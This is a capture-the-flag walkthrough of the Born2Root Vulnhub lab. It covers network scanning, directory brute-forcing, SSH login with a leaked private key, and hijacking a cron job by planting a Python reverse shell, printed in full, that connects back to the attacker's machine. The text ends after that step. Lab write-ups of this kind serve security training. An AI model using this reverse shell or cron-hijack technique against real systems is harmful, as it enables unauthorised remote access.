# **Born2Root: CTF challenge on Vulnhub**

## **Scenario**
This laboratory descibes an attack towards a VM called _Born2Root_ that contains 3 different users. The objective is to capture the flag after obtaining root priviledges on target machine.

**Threat model**: the adversary has access to the subnet where the target machine is located

## **Virtual Enviroments**
1. **Kali Linux 2023.3** -> attacker machine
2. **Born2Root Debian 32 bits** -> target VM that contains the flag

## **Tools**
1. **Nmap** -> Identify devices and open ports
2. **Dirb** ->  command-line web content scanner used for brute-forcing directories and files on web servers
3. **Netcat** -> tool used for starting a listener on a certain port
4. **Cupp** -> tool designed for social engineering-based password list generation
5. **Crunch** -> command-line tool used to generate custom wordlists

## **Execution Steps**

### Network Discovery

The attacker uses `ip a` to gain knowledge of his private ip (10.0.2.4 in this case) and uses this information to gain knowledge of the network with the command `nmap -sV 10.0.2.0/24 `.

"-sV" abilitates nmap to try and determine the services on the open ports.

![nmap_command_result](images/nmap_result.png)

Port 80 is open so the attacker types the ip address of the target machine in his browser tab, accessing the following web page:

![web_page_image](images/web_page.png)

No notable information can be found here, so the attacker uses the command `dirb http://10.0.2.5` to explore more directories in hopes of finding useful data.
The results from this operation are as follows:

```markdown
---- Scanning URL: http://10.0.2.5/ ----
==> DIRECTORY: http://10.0.2.5/files/                                                                   
==> DIRECTORY: http://10.0.2.5/icons/                                                                                                                     
+ http://10.0.2.5/index.html (CODE:200|SIZE:5651)                                                                                                    
==> DIRECTORY: http://10.0.2.5/manual/                                                                                                                    
+ http://10.0.2.5/robots.txt (CODE:200|SIZE:57)                                                                                                           
+ http://10.0.2.5/server-status (CODE:403|SIZE:296) 
```

After some exploration, with his browser, of the directories the attacker understands that the only interesting one is /icons.
He finds a file called **VDSoyuAXiO.txt**, that contains a private key!

Once copied to the sshKey.txt file it is ready to be used to spawn a shell using ssh.
The code used is the following:

1. `chmod 600 sshKey`: commmand  needed because ssh only accepts a key that can be read by the propetary

2. `ssh -i sshKey martin@10.0.2.5`: the _-i_ is used to specify a certain private key. This command doesn't work because of the following error: _sign_and_send_pubkey: no mutual signature supported_. This happens because the private key is RSA and in modern clients this cryptography is deactivated by default (weak keys).

3. `ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostkeyAlgorithms=+ssh-rsa -i sshKey martin@10.0.2.5`: this is the command that abilitates the use of RSA keys and spawns a shell on the target machine as user martin.
   
![martin_ssh](images/martin_ssh.png)

Once inside we explore the file system starting from / and we encounter the file **Crontab** in /etc/Crontab.
This is a file that specifies scheduled tasks on Unix/Linux Systems.

![crontab](images/crontab.png)

The attacker finds that a file to called **sekurity.py**, in the /tmp/, is to be executed every 5 minutes. But the file is missing from the folder. So we create a reverse shell of our own and save it as sekurity.py in the /tmp/ folder.

content of the file sekurity.py:

```python
  #!/usr/bin/python  ->  used to activate the python interpreter
  import socket,subprocess,os 
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # -> creates an IPv4 socket
  s.connect(("10.0.2.4",1337)) # -> connects the socket to Kali machine on port 1337
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2) # -> redirecting all stdin, stdout, stderrof the process to the socket
  p=subprocess.call(["/bin/sh","-i"])  # -> starts an interactive shell that communicates over the socket
```

<!-- ![Photo of Mountain](screenshot.png) -->

<!-- [Docsify](https://docsify.js.org/#/) -->

